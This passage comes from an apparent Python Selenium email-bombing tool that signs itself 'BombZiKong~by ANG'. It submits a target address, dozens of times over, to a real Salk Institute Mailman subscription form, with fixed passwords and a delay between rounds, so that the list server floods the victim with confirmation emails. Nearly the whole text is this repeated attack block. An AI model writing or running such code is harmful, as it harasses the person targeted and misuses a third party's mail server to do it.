print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


print(bcolors.Redd + """done good bye made by ANG""")




